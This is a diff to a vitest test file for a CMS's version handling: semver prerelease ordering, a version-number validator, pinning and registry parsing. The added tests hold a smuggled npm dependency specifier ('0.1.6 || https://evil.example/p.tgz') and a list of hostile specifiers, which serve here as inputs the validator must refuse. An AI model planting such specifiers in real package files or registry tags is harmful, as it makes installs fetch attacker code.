@@ -1,6 +1,10 @@
-import { describe, it, expect } from "vitest";
+import { describe, it, expect, vi, afterEach } from "vitest";
 import {
   compareVersions,
+  isVersion,
+  fetchRegistry,
+  loadVersionState,
+  setPinnedVersion,
   updateAvailable,
   securityUpdateRequired,
   strandsOwner,
@@ -9,6 +13,7 @@ import {
   SELF_UPDATE_SINCE,
   type VersionState,
 } from "./version";
+import type { GitHubClient } from "./github";
 
 // A tenant on `live`, with the registry offering `latest` and flooring at `critical`.
 function state(
@@ -144,5 +149,158 @@ describe("compareVersions across a two-digit segment", () => {
     expect(compareVersions("0.1.2", "0.1.10")).toBeLessThan(0);
     expect(compareVersions("0.10.0", "0.9.0")).toBeGreaterThan(0);
     expect(compareVersions("10.0.0", "9.0.0")).toBeGreaterThan(0);
+  });
+});
+
+// The same lexical trap, one level down. Not reachable while releases stay 0.1.x
+// with no prereleases — it goes live the moment a `-rc` is published, and tagging
+// one `critical` would move the whole fleet onto a prerelease in the wrong order.
+describe("compareVersions inside the prerelease suffix", () => {
+  it("keeps the WHOLE suffix, not just up to the first hyphen", () => {
+    // split("-", 2) discarded everything past the first hyphen, so these compared
+    // EQUAL and neither the CMS nor the fan-out could tell them apart.
+    expect(compareVersions("1.0.0-beta-1", "1.0.0-beta-2")).toBeLessThan(0);
+    expect(compareVersions("1.0.0-beta-2", "1.0.0-beta-1")).toBeGreaterThan(0);
+  });
+
+  it("orders numeric prerelease identifiers numerically", () => {
+    expect(compareVersions("1.0.0-rc.10", "1.0.0-rc.9")).toBeGreaterThan(0);
+    expect(compareVersions("1.0.0-rc.2", "1.0.0-rc.10")).toBeLessThan(0);
+  });
+
+  it("follows semver §11 for mixed and shorter identifier sets", () => {
+    expect(compareVersions("1.0.0-alpha", "1.0.0-alpha.1")).toBeLessThan(0);
+    expect(compareVersions("1.0.0-alpha.1", "1.0.0-beta")).toBeLessThan(0);
+    expect(compareVersions("1.0.0-rc.1", "1.0.0-rc.1")).toBe(0);
+  });
+});
+
+// The value written here is the VALUE of dependencies["lanza-site"], which npm
+// reads as a dependency SPECIFIER. `0.1.6 || https://evil.example/p.tgz` compares
+// as newer than 0.1.5, clears the critical floor, and npm then installs from that
+// URL — nothing published, nothing for provenance to catch.
+const SPECIFIER_INJECTION = "0.1.6 || https://evil.example/p.tgz";
+
+describe("isVersion", () => {
+  it("accepts released version numbers", () => {
+    expect(isVersion("0.1.10")).toBe(true);
+    expect(isVersion("1.0.0-rc.1")).toBe(true);
+  });
+
+  it("refuses anything that is a dependency specifier rather than a number", () => {
+    for (const bad of [
+      SPECIFIER_INJECTION,
+      "https://evil.example/p.tgz",
+      "file:../lanza",
+      "github:attacker/lanza-site",
+      "npm:evil@1.0.0",
+      "*",
+      "latest",
+      "^0.1.1",
+      "0.1", // not a full triple
+      " 0.1.6",
+      "0.1.6\n",
+      "",
+      null,
+      undefined,
+      123,
+    ]) {
+      expect(isVersion(bad), String(bad)).toBe(false);
+    }
+  });
+});
+
+/** A GitHubClient that records writes instead of making them. */
+function spyClient(pkg: Record<string, unknown>) {
+  const writes: string[] = [];
+  const client = {
+    loadJson: async () => ({ data: structuredClone(pkg), sha: "sha1" }),
+    saveJson: async (path: string) => {
+      writes.push(`save ${path}`);
+    },
+    deleteFileIfExists: async (path: string) => {
+      writes.push(`delete ${path}`);
+    },
+    listCommits: async () => [],
+  } as unknown as GitHubClient;
+  return { client, writes };
+}
+
+describe("setPinnedVersion", () => {
+  const pkg = { dependencies: { "lanza-site": "0.1.5" } };
+
+  it("refuses a specifier and writes NOTHING", async () => {
+    const { client, writes } = spyClient(pkg);
+    await expect(setPinnedVersion(client, SPECIFIER_INJECTION)).rejects.toThrow(
+      /not a version number/,
+    );
+    // Not even the lockfile delete — the guard runs before any GitHub call.
+    expect(writes).toEqual([]);
+  });
+
+  it("still pins a real version", async () => {
+    const { client, writes } = spyClient(pkg);
+    await setPinnedVersion(client, "0.1.10");
+    expect(writes).toEqual(["delete package-lock.json", "save package.json"]);
+  });
+});
+
+describe("fetchRegistry", () => {
+  afterEach(() => vi.unstubAllGlobals());
+
+  function stubRegistry(doc: unknown) {
+    vi.stubGlobal("fetch", async () => new Response(JSON.stringify(doc), { status: 200 }));
+  }
+
+  it("drops a dist-tag that is not a version number", async () => {
+    // A hostile or malformed tag must read as ABSENT: no latest → no offer, no
+    // critical → no floor. Both are the existing safe defaults.
+    stubRegistry({
+      "dist-tags": { latest: SPECIFIER_INJECTION, critical: "file:../evil" },
+      versions: { "0.1.5": {}, "0.1.10": {} },
+    });
+    const info = await fetchRegistry();
+    expect(info.latest).toBe("");
+    expect(info.critical).toBe(null);
+  });
+
+  it("drops a version key that is not a version number", async () => {
+    // Every key becomes a clickable Update button.
+    stubRegistry({
+      "dist-tags": { latest: "0.1.10" },
+      versions: { "0.1.9": {}, "0.1.10": {}, [SPECIFIER_INJECTION]: {} },
+    });
+    const info = await fetchRegistry();
+    expect(info.releases.map((r) => r.version)).toEqual(["0.1.10", "0.1.9"]);
+  });
+});
+
+describe("a pin that is not a release reads as unmanaged", () => {
+  // Matches the broker's verdictFor: a self-hoster on file:, a fork on a git URL
+  // or anyone on `*` is not a site running a release. Judging them version 0 made
+  // the CMS nag them and the fan-out force-rewrite their repo.
+  async function stateFor(pin: string) {
+    const { client } = spyClient({ dependencies: { "lanza-site": pin } });
+    vi.stubGlobal("fetch", async () => new Response("{}", { status: 200 }));
+    try {
+      return await loadVersionState(client);
+    } finally {
+      vi.unstubAllGlobals();
+    }
+  }
+
+  it("treats file:/git/star pins as no pin at all", async () => {
+    for (const pin of ["file:../lanza", "github:someone/lanza-site", "*", "latest"]) {
+      const s = await stateFor(pin);
+      expect(s.live, pin).toBe(null);
+      expect(s.unmanaged, pin).toBe(true);
+    }
+  });
+
+  it("still reads a normal pin, with or without a range prefix or a leading v", async () => {
+    expect((await stateFor("0.1.10")).live).toBe("0.1.10");
+    expect((await stateFor("^0.1.10")).live).toBe("0.1.10");
+    // v1.0.0 used to parse to [0,0,0] and read as ancient — below every floor.
+    expect((await stateFor("v1.0.0")).live).toBe("1.0.0");
   });
 });
